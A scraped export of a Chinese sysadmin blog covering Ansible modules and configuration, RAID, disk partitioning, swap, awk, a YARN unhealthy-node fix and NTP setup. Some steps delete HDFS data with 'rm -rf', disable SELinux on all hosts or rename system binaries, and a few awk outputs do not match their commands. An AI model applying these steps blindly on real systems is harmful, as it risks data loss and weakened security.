弃用了，使用special_time更好，表示重启后执行 special_time # 特殊时间规格昵称。 state # 是否确保工作或环境变量存在或不存在。 user # crontab应该修改的具体用户。 weekday # 任务执行时间：周几 ( 0-6 for Sunday-Saturday, *, etc ) 举个例子： 每10分钟输出一次 hello 12345ansible 127.0.0.1 -m cron -a &#39;minute&#x3D;&quot;*&#x2F;10&quot; job&#x3D;&quot;&#x2F;bin&#x2F;echo My Name Is Garywu. &gt;&gt;&#x2F;root&#x2F;echo.txt&quot; name&#x3D;&quot;test ansible-cron&quot;&#39;crontab -l 查看tailf &#x2F;var&#x2F;log&#x2F;cron 查看cron任务运行情况tailf &#x2F;root&#x2F;echo.txt 查看内容实时输出 12345# 移除定时任务ansible local -m cron -a &#39;minute&#x3D;&quot;*&#x2F;10&quot; job&#x3D;&quot;&#x2F;bin&#x2F;echo My Name Is Garywu. &gt;&gt;&#x2F;root&#x2F;echo.txt&quot; name&#x3D;&quot;test ansible-cron&quot; state&#x3D;absent&#39;absent翻译：缺席不存在的present翻译：出现的，存在的 查看某个模块的帮助 ansible-doc -s 模块名称，例如： 12345678ansible-doc -s group- name: Add or remove groups action: group gid # Optional &#96;GID&#39; to set for the group. name&#x3D; # Name of the group to manage. state # Whether the group should be present or not on the remote host. system # If &#96;yes&#39;, indicates that the group created is a system group. user操作用户 12345# 创建用户ansible local -m user -a &#39;name&#x3D;&quot;garywu&quot; shell&#x3D;&quot;&#x2F;bin&#x2F;bash&quot; groups&#x3D;&quot;test&quot; append&#x3D;yes&#39;# 强制删除用户ansible local -m user -a &#39;name&#x3D;&quot;zing1&quot; state&#x3D;absent remove&#x3D;yes&#39; 1234567891011121314151617181920参数说明：action: usercomment # 用户的描述信息createhom # 是否创建家目录force # 在使用&#96;state&#x3D;absent&#39;是, 行为与&#96;userdel --force&#39;一致.group # 指定基本组groups # 指定附加组，如果指定为(&#39;groups&#x3D;&#39;)表示删除所有组home # 指定用户家目录login_class #可以设置用户的登录类 FreeBSD, OpenBSD and NetBSD系统.move_home # 如果设置为&#96;home&#x3D;&#39;时, 试图将用户主目录移动到指定的目录name&#x3D; # 指定用户名non_unique # 该选项允许改变非唯一的用户ID值password # 指定用户密码remove # 在使用 &#96;state&#x3D;absent&#39;时, 行为是与 &#96;userdel --remove&#39;一致.shell # 指定默认shellstate #设置帐号状态，不指定为创建，指定值为absent表示删除system # 当创建一个用户，设置这个用户是系统用户。这个设置不能更改现有用户。uid #指定用户的uidupdate_password # 更新用户密码expires #指明密码的过期时间 group操作用户组 12345# 创建组ansible local -m group -a &#39;name&#x3D;&quot;mysql&quot; gid&#x3D;306 system&#x3D;yes&#39;# 删除组ansible 127.0.0.1 -m group -a &#39;name&#x3D;&quot;test&quot; state&#x3D;absent system&#x3D;no&#39; copy复制文件 1234567# 将本地源文件 拷贝到远程主机上ansible 127.0.0.1 -m copy -a &#39;src&#x3D;&#x2F;home&#x2F;源.txt dest&#x3D;&#x2F;opt&#x2F;目的.txt owner&#x3D;&quot;root&quot; mode&#x3D;640&#39;src&#x3D;本地目标（可以是文件夹）dest&#x3D;远程目标（可以是文件夹）owner&#x3D;远程文件所有者mode&#x3D;指定远程文件权限 Ping 检测主机存活 1ansible -i hosts hue -m ping # ping所有主机 setup模块 1# 获取指定主机的facts, facts就是变量，内建变量 。每个主机的各种信息，cpu颗数、内存大小等。会存在facts中的某个变量中。 管理selinux 12#关闭selinuxansible -i hosts all -m selinux -a &#39;state&#x3D;disabled&#39; script模块 1ansible -i hosts all -m script -a &#39;&#x2F;etc&#x2F;init.d&#x2F;zabbix&#39; ​ shell 模块 12#运行命令ansible -i lf_host hue -m shell -a &quot;yum install -y ganglia-gmond&quot; -s ​","categories":[],"tags":[{"name":"Ansible","slug":"Ansible","permalink":"https://garywu520.github.io/tags/Ansible/"},{"name":"模块","slug":"模块","permalink":"https://garywu520.github.io/tags/%E6%A8%A1%E5%9D%97/"}]},{"title":"Ansible自动化入门","slug":"Ansible自动化入门","date":"2017-07-11T10:51:21.000Z","updated":"2017-07-11T10:52:58.112Z","comments":true,"path":"2017/07/11/Ansible自动化入门/","link":"","permalink":"https://garywu520.github.io/2017/07/11/Ansible%E8%87%AA%E5%8A%A8%E5%8C%96%E5%85%A5%E9%97%A8/","excerpt":"Ansible特性： ansible基于Python实现，有Paramiko、PyYAML、Jinjia2主要模块 使用SSH连接主机，部署简单 可以使用自定义模块，也可以使用其他语言编写模块，基于模块可以完成各种任务","text":"Ansible特性： ansible基于Python实现，有Paramiko、PyYAML、Jinjia2主要模块 使用SSH连接主机，部署简单 可以使用自定义模块，也可以使用其他语言编写模块，基于模块可以完成各种任务 安装Ansible管理机123yum install -y epel-release yum install -y ansibleansible --version 配置Ansible123Ansible重要的配置文件：ansible.cfg: ansible全局配置hosts: 是ansible管理的主机列表和部分参数 配置参数-参考(主要是配置hosts文件位置) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# (扩展插件存放目录)action_plugins &#x3D; &#x2F;usr&#x2F;share&#x2F;ansible_plugins&#x2F;action_plugins # (插入Ansible模板的字符串)ansible_managed &#x3D; Ansible managed: &#123;file&#125; modified on %Y-%m-%d %H:%M:%S by &#123;uid&#125; on &#123;host&#125;# （PlayBook是否需要提供密码，默认为No）# ask_pass&#x3D;True# （PlayBook是否需要提供sudo 密码）[](http:&#x2F;&#x2F;www.ansible.cn&#x2F;docs&#x2F;intro_configuration.html#ask-sudo-pass)# ask_sudo_pass&#x3D;True# （回调函数插件存放路径）action_plugins &#x3D; &#x2F;usr&#x2F;share&#x2F;ansible_plugins&#x2F;action_plugins# （连接插件存放路径）action_plugins &#x3D; &#x2F;usr&#x2F;share&#x2F;ansible_plugins&#x2F;action_plugins# （是否展示警告信息）deprecation_warnings &#x3D; True# （是否展示跳过的主机的信息）# display_skipped_hosts&#x3D;True# （执行错误时候赋予的变量）# error_on_undefined_vars&#x3D;True# （默认的Shell）# executable &#x3D; &#x2F;bin&#x2F;bash# （拦截器插件）action_plugins &#x3D; &#x2F;usr&#x2F;share&#x2F;ansible_plugins&#x2F;action_plugins# （最大进程数）forks&#x3D;5# （哈希特性，没事不用去动它）# hash_behavior&#x3D;replace# （资产文件存放位置）hostfile &#x3D; &#x2F;etc&#x2F;ansible&#x2F;hosts# （是否检查SSH key）host_key_checking&#x3D;True# （JinJa扩展）jinja2_extensions &#x3D; jinja2.ext.do,jinja2.ext.i18n# （PlayBook变量）legacy_playbook_variables &#x3D; no# （Ansible默认库）library &#x3D; &#x2F;usr&#x2F;share&#x2F;ansible# （日志路径）log_path&#x3D;&#x2F;var&#x2F;log&#x2F;ansible.log# （插件路径）action_plugins &#x3D; &#x2F;usr&#x2F;share&#x2F;ansible_plugins&#x2F;action_plugins# （默认模块名称）module_name &#x3D; command# (输出样式)nocolor&#x3D;0# (是否使用cowsay打印)nocows&#x3D;0# （主机）hosts&#x3D;*# （pool间隔）poll_interval&#x3D;15# （私钥的存放路径）private_key_file&#x3D;&#x2F;path&#x2F;to&#x2F;file.pem# （远程连接端口号）remote_port &#x3D; 22# (远程目录临时文件夹)remote_temp &#x3D; $HOME&#x2F;.ansible&#x2F;tmp# （远程用户）remote_user &#x3D; root# （角色路径）roles_path &#x3D; &#x2F;opt&#x2F;mysite&#x2F;roles# （SUDO执行）sudo_exe&#x3D;sudo# （SUDO标记）sudo_flags&#x3D;-H# （sudo用户）sudo_user&#x3D;root# （重连次数）timeout &#x3D; 10# （传输模式） 默认用的smarttransport# （变量插件存放路径）action_plugins &#x3D; &#x2F;usr&#x2F;share&#x2F;ansible_plugins&#x2F;action_plugins# SSH变量# (SSH连接参数)ssh_args &#x3D; -o ControlMaster&#x3D;auto -o ControlPersist&#x3D;60s# （采用SCP还是SFTP进行文件传输）scp_if_ssh&#x3D;False hosts文件hosts文件是ansible管理主机的Inventory文件，里面存放的是主机组和部分参数 例如： 123456789101112131415161718[local]127.0.0.2 ansible_ssh_port&#x3D;22 ansible_user&#x3D;zing ansible_ssh_pass&#x3D;# 单独的主机域名mail.example.com#单独的主机ip8.8.8.8[webservers] #主机组的名称127.0.0.1 #主机1bar.example.com #主机2[dbservers] #新的主机组one.example.com #主机1two.example.com #主机2three.example.com port：ssh到目标主机的端口; user：目标主机将会以这个身份登录; pass：目标主机该用户的密码中括号内是主机的分组名 先尝试输出: hello world123456789[root@cm-master ansible]# ansible 127.0.0.1 -m command -a &#39;echo &quot;hello world&quot;&#39; [WARNING]: provided hosts list is empty, only localhost is available127.0.0.1 | SUCCESS | rc&#x3D;0 &gt;&gt;hello world命令组成：ansible 127.0.0.1 -m command -a &#39;echo &quot;hello world&quot;&#39; ansible关键字 主机组 指定模块 执行的命令 1234567891011如果默认的hosts文件中，定义了主机组，也可以将ip换成主机组的名字# &#x2F;etc&#x2F;ansible&#x2F;hosts 文件[local]127.0.0.1例如：aisible local -m command -a &#39;echo hello world&#39;local会去hosts文件中找到对应的组，组下的每一台机器都会运行指令。如果想让所以主机全部执行aisible all -m command -a &#39;echo hello world&#39; Ansible模块查询12345678# 查询所有模块ansible-doc -l# 查看command模块ansible-doc command# 查看shell 模块ansible-doc shell","categories":[],"tags":[{"name":"Ansible","slug":"Ansible","permalink":"https://garywu520.github.io/tags/Ansible/"}]},{"title":"cloudera manager群集安装报错","slug":"cloudera-manager群集安装报错","date":"2017-07-10T06:06:46.000Z","updated":"2017-07-10T06:29:25.175Z","comments":true,"path":"2017/07/10/cloudera-manager群集安装报错/","link":"","permalink":"https://garywu520.github.io/2017/07/10/cloudera-manager%E7%BE%A4%E9%9B%86%E5%AE%89%E8%A3%85%E6%8A%A5%E9%94%99/","excerpt":"[cloudera Web第4步安装过程中报错: socket.gaierror: [Errno -2] Name or service not known CDH版本：5.2.0","text":"[cloudera Web第4步安装过程中报错: socket.gaierror: [Errno -2] Name or service not known CDH版本：5.2.0 原因：群集安装时, agent会使用host命令反向解析获取cloudera manager server 主机名 不优雅解决方案：删除/usr/bin/host 命令文件 mv /usr/bin/host /usr/bin/host.bak","categories":[],"tags":[{"name":"CDH","slug":"CDH","permalink":"https://garywu520.github.io/tags/CDH/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"cloudera","slug":"cloudera","permalink":"https://garywu520.github.io/tags/cloudera/"},{"name":"socket.gaierror","slug":"socket-gaierror","permalink":"https://garywu520.github.io/tags/socket-gaierror/"}]},{"title":"老男孩-Day11-磁盘管理与AWK数组","slug":"老男孩-Day11-磁盘管理与AWK数组","date":"2017-07-08T01:39:13.000Z","updated":"2017-07-12T14:03:33.217Z","comments":true,"path":"2017/07/08/老男孩-Day11-磁盘管理与AWK数组/","link":"","permalink":"https://garywu520.github.io/2017/07/08/%E8%80%81%E7%94%B7%E5%AD%A9-Day11-%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86%E4%B8%8EAWK%E6%95%B0%E7%BB%84/","excerpt":"RIAD123456789101112RIAD0 磁盘容量不浪费，存储性好，读写速度块。至少要有1块物理磁盘才能使用RIAD0RIAD1 镜像，磁盘容量损失50% ；只能2块盘做1个RIAD1。 应用场景：对数据安全性比较高的情况下使用。RIAD5 至少需要3块以上物理磁盘才能实现RIAD5. 空间利用率n-1 如果任意1块硬盘坏掉，通过奇偶校验会将数据恢复。 RIAD5+Spare（空闲热备盘）RIAD10 至少需要4块硬盘","text":"RIAD123456789101112RIAD0 磁盘容量不浪费，存储性好，读写速度块。至少要有1块物理磁盘才能使用RIAD0RIAD1 镜像，磁盘容量损失50% ；只能2块盘做1个RIAD1。 应用场景：对数据安全性比较高的情况下使用。RIAD5 至少需要3块以上物理磁盘才能实现RIAD5. 空间利用率n-1 如果任意1块硬盘坏掉，通过奇偶校验会将数据恢复。 RIAD5+Spare（空闲热备盘）RIAD10 至少需要4块硬盘 dd命令123456dd if&#x3D;&#x2F;dev&#x2F;sda of&#x3D;&#x2F;tmp&#x2F;mbr.bin bs&#x3D;512 count&#x3D;1if（input file）输入文件或设备名称，从哪里读取数据of (output file) 输出文件或设备名称，把数据放到哪里bs(block size) 每次读取数据的大小,单位字节count 读取多少次 分区名称123456789sata&#x2F;scsi&#x2F;sas 以sd开头 sata第一块硬盘 sdasata第二块硬盘 sdbsata磁盘第一块硬盘的第一个分区 sda1sata磁盘第一块硬盘的第一个逻辑 sda5第二块ide磁盘的第一个分区 hdb1第三块sas磁盘的第二个分区 sdc2第四块sata磁盘的第二个逻辑分区 sdd6 fdisk磁盘分区12345678fdisk -cu &#x2F;dev&#x2F;sdb 分区Command (m for help): n +50M 例如分50M空间p 查看分区w 保存注：（输入错误的话，ctrl+u 清除） Parted磁盘分区1234567fdisk与Parted区别？（1）fdisk用于小于2TB磁盘，大于2TB需要使用parted命令（2）fdisk需要使用w命令保存后才能生效，而parted命令配置实时生效。引导记录小于2TB的磁盘引导记录叫做MBR（BIOS）大于2TB的磁盘引导记录叫做GPT（UEFI）【它的出现是为了解决主分区最多只能有4个的问题】 1234567parted &#x2F;dev&#x2F;sdcprint 显示磁盘分区信息mklable或mktable 创建磁盘分区表mkpart name exit4 0 50 创建分区,默认单位M （其中，name随意定义; exit4文件系统类型）rm 1 删除第一个分区quit 推出parted状态 刷新分区表、格式化与挂载12345678910111213141516通知系统某个磁盘的分区表改变了partprobe &#x2F;dev&#x2F;sdb格式化mkfs.ext4 &#x2F;dev&#x2F;sdb1 格式化为ext4挂载mount &#x2F;dev&#x2F;sdb1 &#x2F;mnt 把&#x2F;dev&#x2F;sdb1分区挂载到&#x2F;mnt目录下卸载已挂载的目录umount &#x2F;mnt 开机自动挂载vim &#x2F;etc&#x2F;fstab&#x2F;dev&#x2F;sdb1 &#x2F;mnt ext4 defaults 0 0 挂载分区 挂载目录 系统文件类型 参数 是否需要备份 注：This filesystem will be automatically checked every 37 mounts or 180 days, whichever comes first. 这个分区在每挂载37次的时候或每180天进行一次磁盘检查 fsck 取消fsck磁盘检查功能tune2fs -c 0 -i 0 /dev/sdb1 企业案例：利用文件来增加swap空间123456789101112131415161718192021222324251. 创建文件块 # dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;tmp&#x2F;100m bs&#x3D;1M count&#x3D;100 &#x2F;dev&#x2F;zero文件代表一个永远输出 0的设备文件，使用它作输入可以得到全为空的文件。 # ll &#x2F;tmp&#x2F;100m -h -rw-r--r--. 1 root root 100M Jul 4 12:49 &#x2F;tmp&#x2F;100m 2. 让这个文件块成为swap [root@oldboy202 ~]# file &#x2F;tmp&#x2F;100m 查看类型 [root@oldboy202 ~]# mkswap &#x2F;tmp&#x2F;100m 让文件块成为swap [root@oldboy202 ~]#file &#x2F;tmp&#x2F;100m 再查看类型 3. 给正在使用的swap增加空间 free -m 查看目前swap空间 swapon &#x2F;tmp&#x2F;100m 给正在使用的swap增加空间 free -m 再次检验开机自动挂载swapvim &#x2F;etc&#x2F;fstab&#x2F;dev&#x2F;sdb1 &#x2F;mnt ext4 defaults 0 0&#x2F;tmp&#x2F;100m swap swap defaults 0 0注；卸载或删除增加的swap空间 swapoff &#x2F;tmp&#x2F;100mswapon -a 挂载所有的swap，也可以作为验证&#x2F;etc&#x2F;fstab中关于swap配置的正确性。 AWK数组awk查找123456789101112131415awk &#39;NR&#x3D;&#x3D;5&#39; passwd 显示第5行（2个等号才表示等于）awk &#39;条件&#123;动作&#125;&#39; filenameawk &#39;模式&#123;动作&#125;&#39; filenameawk -F &quot;:&quot; &#39;NR&#x3D;&#x3D;5&#123;print $NF&#125;&#39; passwd 显示第5行的最后一列&#x2F;sbin&#x2F;nologinawk &#39;&#x2F;^root&#x2F;&#39; passwd 查找出以root开头的行[root@oldboy202 ~]# awk -F “:” &#39;$6~&#x2F;home&#x2F;&#39; passwd 查找第6列中包含home的行oldboy:x:500:501::&#x2F;home&#x2F;oldboy:&#x2F;bin&#x2F;basholdgirl:x:501:501::&#x2F;home&#x2F;oldgirl:&#x2F;bin&#x2F;bash注；波浪线（~）表示包含 AWK12345678910111213141516171819202122232425测试环境mkdir -p &#x2F;server&#x2F;files&#x2F;cat &gt;&gt;&#x2F;server&#x2F;files&#x2F;reg.txt&lt;&lt;EOFZhang Dandan 41117397 :250:100:175Zhang Xiaoyu 390320151 :155:90:201Meng Feixue 80042789 :250:60:50Wu Waiwai 70271111 :250:80:75Liu Bingbing 41117483 :250:100:175Wang Xiaoai 3515064655 :50:95:135Zi Gege 1986787350 :250:168:200Li Youjiu 918391635 :175:75:300Lao Nanhai 918391635 :250:100:175EOF注： &#39;&#x2F;oldboy&#x2F;&#39; 就相当于 &#39;$0&#x2F;oldboy&#x2F;&#39; 表示整行（1）显示姓Zhang第二次捐款的金额（并显示姓名）[root@oldboy202 files]# awk -F &quot;[ :]+&quot; &#39;$1~&#x2F;^Zhang&#x2F;&#123;print $1,$2,$5&#125;&#39; reg.txt Zhang Dandan 100Zhang Xiaoyu 90[root@oldboy202 files]# awk -F &quot;[ :]+&quot; &#39;$1~&#x2F;^Zhang&#x2F;&#123;print $1,$2,$(NF-1)&#125;&#39; reg.txt Zhang Dandan 100Zhang Xiaoyu 90注；波浪线（~）表示包含. $1~ 表示第一列包含XXX 123456（2）显示Xiaoyu的姓氏和ID号码[root@oldboy202 files]# awk &#39;$2~&#x2F;Xiaoyu&#x2F;&#39; reg.txt Zhang Xiaoyu 390320151 :155:90:201[root@oldboy202 files]# awk &#39;$2~&#x2F;Xiaoyu&#x2F;&#123;print $1,$3&#125;&#39; reg.txt Zhang 390320151 1234（3）查找第三列以41开头的行[root@oldboy202 files]# awk &#39;$3~&#x2F;^41&#x2F;&#39; reg.txt Zhang Dandan 41117397 :250:100:175Liu Bingbing 41117483 :250:100:175 1234显示所有以41开头的ID号码的人的全名和ID号码[root@oldboy202 files]# awk &#39;$3~&#x2F;^41&#x2F;&#123;print $1,$2,$3&#125;&#39; reg.txt Zhang Dandan 41117397Liu Bingbing 41117483 12345678910111213141516171819202122显示所有以一个D或X开头的人名全名[root@oldboy202 files]# awk &#39;$2~&#x2F;^D|^X&#x2F;&#39; reg.txt Zhang Dandan 41117397 :250:100:175Zhang Xiaoyu 390320151 :155:90:201Wang Xiaoai 3515064655 :50:95:135[root@oldboy202 files]# awk &#39;$2~&#x2F;^D|^X&#x2F;&#123;print $1,$2&#125;&#39; reg.txt Zhang Dandan 41117397 :250:100:175Zhang Xiaoyu 390320151 :155:90:201Wang Xiaoai 3515064655 :50:95:135##################################################################[root@oldboy202 files]# awk &#39;$2~&#x2F;^[DX]&#x2F;&#39; reg.txt Zhang Dandan 41117397 :250:100:175Zhang Xiaoyu 390320151 :155:90:201Wang Xiaoai 3515064655 :50:95:135[root@oldboy202 files]# awk &#39;$2~&#x2F;^[DX]&#x2F;&#123;print $1,$2&#125;&#39; reg.txt Zhang DandanZhang XiaoyuWang Xiaoai 1234567891011121314显示ID号为1或5结尾的人的全名[root@oldboy202 files]# awk &#39;$3~&#x2F;[14$]&#x2F;&#39; reg.txt 方法1Zhang Dandan 41117397 :250:100:175Zhang Xiaoyu 390320151 :155:90:201Meng Feixue 80042789 :250:60:50Wu Waiwai 70271111 :250:80:75[root@oldboy202 files]# awk &#39;$3~&#x2F;1$|5$&#x2F;&#39; reg.txt 方法2Zhang Xiaoyu 390320151 :155:90:201Wu Waiwai 70271111 :250:80:75Wang Xiaoai 3515064655 :50:95:135Li Youjiu 918391635 :175:75:300 1234567891011显示Xiaoyu的捐款，结果每个值都以$开头，如$520$200$135 awk &#39;$2~&#x2F;Xiaoyu&#x2F;&#123;print $NF&#125;&#39; reg.txt |tr &quot;:&quot; &quot;$&quot; 方法1$155$90$201awk &#39;$2~&#x2F;Xiaoyu&#x2F;&#123;gsub(&#x2F;:&#x2F;,&quot;$&quot;,$NF);print $NF&#125;&#39; reg.txt 方法2$155$90$201gsub格式：gsub(找谁,替换成什么,替换哪一列)gsub(找谁,替换成什么) &#x3D;&#x3D;&#x3D;&#x3D; gsub(找谁,替换成什么,$0)echo oldboy|awk &#39;&#123;gsub(&#x2F;oldboy&#x2F;,&quot;oldgirl&quot;);print $0&#125;&#39; 1234567891011显示所有人的全名，以姓,名的格式显示，如Meng,Feixue[root@oldboy202 files]# awk &#39;&#123;print $1,$2&#125;&#39; reg.txt Zhang DandanZhang XiaoyuMeng FeixueWu WaiwaiLiu BingbingWang XiaoaiZi GegeLi YoujiuLao Nanhai 123查找第二列包含Waiwai的列，并替换$3列中的内容70271111改为garywu[root@oldboy202 files]# awk -F &quot;[ ]+&quot; &#39;$2~&#x2F;Waiwai&#x2F;&#123;gsub(&#x2F;70271111&#x2F;,&quot;garywu&quot;,$3);print $3&#125;&#39; reg.txt garywu 数组12345678测试环境vim html.txthttp:&#x2F;&#x2F;www.etiantian.org&#x2F;index.htmlhttp:&#x2F;&#x2F;www.etiantian.org&#x2F;1.htmlhttp:&#x2F;&#x2F;post.etiantian.org&#x2F;index.htmlhttp:&#x2F;&#x2F;mp3.etiantian.org&#x2F;index.htmlhttp:&#x2F;&#x2F;www.etiantian.org&#x2F;3.htmlhttp:&#x2F;&#x2F;post.etiantian.org&#x2F;2.html 1234567891011统计第二列内容出现的总次数[root@oldboy202 ~]# awk -F &quot;[:&#x2F;.]+&quot; &#39;&#123;print $2&#125;&#39; html.txt[root@oldboy202 ~]# awk -F &quot;[:&#x2F;.]+&quot; &#39;&#123;print $2&#125;&#39; html.txt |sort |uniq -c 1 mp3 2 post 3 www 注：sort 是排序，务必先排序 uniq -c 统计次数 awk数组 12345678910111213141516171819[root@oldboy202 ~]# awk -F &quot;[&#x2F;.]+&quot; &#39;&#123;myarr[$2]&#x3D;myarr[$2]+1&#125;END&#123;for(x in myarr)print x,myarr[x]&#125;&#39; html.txt www 3mp3 1post 2注：&#123;myarr[$2]&#x3D;myarr[$2]+1&#125; 意思是给数组赋值，当该赋值语句被执行后，则值为myarr[$2]+1END 可以理解为数组赋值定义结束时需要使用&#123;for(x in myarr)print x,myarr[x]&#125; 当你使用for循环中的这个in格式时，awk将把数组中的myarr的每一个赋值交给“循环控制变量” X。在本例中，x即为$2的内容，即www或mp3或post。而myarr[x]就等于myarr[$2]+1&#125; 即计算出的次数。所以后半部分我们要打印计算的结果，所以使用print x,myarr[x] 最终显示的结果就是www 3mp3 1post 2[root@oldboy202 ~]# awk -F &quot;[&#x2F;.]+&quot; &#39;&#123;myarr[$2]++&#125;END&#123;for(x in myarr)print x,myarr[x]&#125;&#39; html.txt www 3mp3 1post 2注： myarr[$2]&#x3D;myarr[$2]+1 可以简写为myarr[$2]++","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"awk数组","slug":"awk数组","permalink":"https://garywu520.github.io/tags/awk%E6%95%B0%E7%BB%84/"},{"name":"磁盘管理","slug":"磁盘管理","permalink":"https://garywu520.github.io/tags/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"}]},{"title":"Yarn不能给某些机器分配任务-解决方案","slug":"Yarn不能给某些机器分配任务-解决方案","date":"2017-07-06T10:53:41.000Z","updated":"2017-07-06T11:03:22.668Z","comments":true,"path":"2017/07/06/Yarn不能给某些机器分配任务-解决方案/","link":"","permalink":"https://garywu520.github.io/2017/07/06/Yarn%E4%B8%8D%E8%83%BD%E7%BB%99%E6%9F%90%E4%BA%9B%E6%9C%BA%E5%99%A8%E5%88%86%E9%85%8D%E4%BB%BB%E5%8A%A1-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/","excerpt":"YARN健康检测123NodeManager 还提供了检测磁盘好坏的机制。检测的磁盘目录主要是 yarn.nodemanager.local-dirs 和 yarn.nodemanager.log-dirs 参数指定的目录，这两个目录分别用于存储应用程序运行的中间结果，比如MapReduce作业中Map Task的中间输出结果）和日志文件存放目录列表。这两个参数都可以配置多个目录，多个目录之间使用逗号分隔。如果这两个参数配置的目录不可用的比例达到一定的设置，则认为该节点不健康。","text":"YARN健康检测123NodeManager 还提供了检测磁盘好坏的机制。检测的磁盘目录主要是 yarn.nodemanager.local-dirs 和 yarn.nodemanager.log-dirs 参数指定的目录，这两个目录分别用于存储应用程序运行的中间结果，比如MapReduce作业中Map Task的中间输出结果）和日志文件存放目录列表。这两个参数都可以配置多个目录，多个目录之间使用逗号分隔。如果这两个参数配置的目录不可用的比例达到一定的设置，则认为该节点不健康。 123456789某个目录可不可用的定义是：运行 NodeManager 节点的进程是否对这个目录可读、可写、可执行。如果这些条件都满足，这个目录则健康，否则该目录就被放入 failedDirs 列表里面。本地目录健康检测主要涉及到以下几个参数：yarn.nodemanager.disk-health-checker.interval-ms：本地目录健康检测线程执行的频率，默认值为2分钟；yarn.nodemanager.disk-health-checker.enable：是否启用本地目录健康检测，默认值是启用；yarn.nodemanager.disk-health-checker.min-healthy-disks：正常目录数目相对于总目录总数的比例，低于这个值则认为此节点处于不正常状态，默认值为0.25。检测机制都会随着 NodeManager 节点启动而运行，并且检测到的状态会随心跳信息发送到 ResourceManager 端，然后 ResourceManager 端会根据相关的信息得到当前节点的可用情况，一旦发现这个节点不健康，则会标记此节点的状态为 NodeState.UNHEALTHY ，此后将不会忘这个节点分配任务，直到该节点状态正常。 现象：Yarn不能给某些机器分配任务-解决方案123456789通过Ganglia登陆yarn群集任一主机，查看所有yarn运行状态yarn node -all -list[root@R710-11 ~]# yarn node -all -listTotal Nodes:100 Node-Id Node-State Node-Http-Address Number-of-Running-ContainersR710-10:8041 RUNNING R710-10:8042 4R710-11:8041 UNHEALTHY R710-11:8042 故障原因：123456Yarn程序对服务器硬件有套检测机制，会及时检测内存数量、vcore数量以及磁盘空间，当某个分区磁盘空间超过90%以上，yarn会将该服务器的节点状态改为UNHEALTHY，此时yarn不会再给此服务器分配任务。服务器硬件环境：R710，此机器上面有2个DataNode数据存放点，Namenode会随机向&#x2F;data&#x2F;A或&#x2F;data&#x2F;B存放数据。&#x2F;data&#x2F;A 使用的是根分区，大小：500G，利用率：96% ，没进行外部挂载&#x2F;data&#x2F;B 使用的是独立挂载分区，大小：4T，利用率: 10%，挂载了外部空间 解决方案：#目标：释放空间,让nodemanager恢复健康#第一步：停止向该服务器继续向/data/A存放数据123登陆CDH - HDFS - 实例 - 搜索对应服务器 - 配置 - 删除“DataNode 数据目录”配置的&#x2F;data&#x2F;A&#x2F;dfs&#x2F;dn - 保存此时，新文件不会再存放到&#x2F;data&#x2F;A, 但原&#x2F;data&#x2F;A下的目录元数据依然存在，依然会占用根分区空间。 #第二步：删除机器上的/data/A目录下的dfs元数据1234567原理了解：HDFS将每份数据默认存放不同位置3份，每次删除2台机器中的&#x2F;data&#x2F;A目录下的dfs数据，就不会导致数据丢失。这个时候，就可以去对应的服务器上直接删除&#x2F;data&#x2F;A下的元数据了[务必与大数据再三确认]。 cd &#x2F;data&#x2F;A &amp;&amp; rm -rf .&#x2F;dfs删除后，使用df -h查看磁盘空间占用情况，可以看到空间已被释放。 #让这台Yarn故障机器恢复使用1234567空间被释放了，如何让Yarn重新给这台机器分配任务继续劳作呢？登陆CDH - YARN - 实例 - 搜索对应机器 - 操作 - “重启此NodeManager” ,重启完毕后，使用命令检测Yarn群集服务器工作状态yarn node -all -list 在结果中搜索下，之前故障的机器，发现故障消除了，状态从UNHEALTHY变成了RUNNING","categories":[],"tags":[{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"YARN","slug":"YARN","permalink":"https://garywu520.github.io/tags/YARN/"},{"name":"NodeManager","slug":"NodeManager","permalink":"https://garywu520.github.io/tags/NodeManager/"}]},{"title":"NTP服务器-部署","slug":"NTP服务器-部署","date":"2017-07-06T03:44:58.000Z","updated":"2017-07-06T03:52:58.398Z","comments":true,"path":"2017/07/06/NTP服务器-部署/","link":"","permalink":"https://garywu520.github.io/2017/07/06/NTP%E6%9C%8D%E5%8A%A1%E5%99%A8-%E9%83%A8%E7%BD%B2/","excerpt":"环境： 共3台服务器 1台为NTP主节点(10.1.2.20)，其余2台为NTP受控节点(10.1.2.21和10.1.2.22)","text":"环境： 共3台服务器 1台为NTP主节点(10.1.2.20)，其余2台为NTP受控节点(10.1.2.21和10.1.2.22) NTP主节点部署123456789101112131415161718192021222324252627282930313233343536373839404142434445(1) 安装NTP（所有节点） yum install ntp(2) 设置NTP服务开机启动（所有节点） chkconfig ntpd on chkconfig --list ntpd (3) 配置cm-master主节点# vim &#x2F;etc&#x2F;ntp.confdriftfile &#x2F;var&#x2F;lib&#x2F;ntp&#x2F;ntp.drift #草稿文件# Hosts on local network are less restricted.# 允许内网其他机器同步时间restrict 10.1.2.0 mask 255.255.255.0 nomodify notrap# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http:&#x2F;&#x2F;www.pool.ntp.org&#x2F;join.html).# 中国这边最活跃的时间服务器 : [http:&#x2F;&#x2F;www.pool.ntp.org&#x2F;zone&#x2F;cn](http:&#x2F;&#x2F;www.pool.ntp.org&#x2F;zone&#x2F;cn)server ntp1.aliyun.com iburst # 阿里云NTP服务器1server ntp2.aliyun.com iburst # 阿里云NTP服务器2# allow update time by the upper server # 允许上层时间服务器主动修改本机时间restrict ntp1.aliyun.com nomodify notrap noqueryrestrict ntp2.aliyun.com nomodify notrap noquery# Undisciplined Local Clock. This is a fake driver intended for backup# and when no outside source of synchronized time is available. # 外部时间服务器不可用时，以本地时间作为时间服务server 127.127.1.0 # local clockfudge 127.127.1.0 stratum 10保存后重启服务service ntpd restart# 查看同步状态netstat -tlunp | grep ntpwatch ntpd –p# 手动同步 ntpdate –u ip NTP从节点部署12345678910111213141516171819202122232425262728293031323334配置子节点（在每一台子节点操作） 